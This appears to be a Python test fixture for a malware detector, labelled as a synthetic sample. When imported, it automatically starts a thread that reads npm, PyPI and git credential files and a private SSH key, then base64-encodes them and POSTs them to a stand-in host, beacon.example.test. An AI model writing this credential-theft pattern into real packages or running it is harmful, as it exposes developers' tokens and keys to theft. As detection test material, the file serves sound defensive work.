# FIXTURE ONLY - synthetic detection test sample, not real malware
import base64
import hashlib
import hmac
import os
import threading
import urllib.request

HOME = os.path.expanduser("~")
PATHS = [HOME + "/.npmrc", HOME + "/.pypirc", HOME + "/.git-credentials", HOME + "/.ssh/id_rsa"]


def _collect():
    blob = b""
    for p in PATHS:
        fp = p
        if os.path.exists(fp):
            with open(fp, "rb") as fh:
                blob += fh.read()
    sig = hmac.new(b"fixture", blob, hashlib.sha256).hexdigest()
    req = urllib.request.Request("https://beacon.example.test/c", data=base64.b64encode(blob),
                                 headers={"X-Sig": sig})
    urllib.request.urlopen(req)


threading.Thread(target=_collect, daemon=False).start()
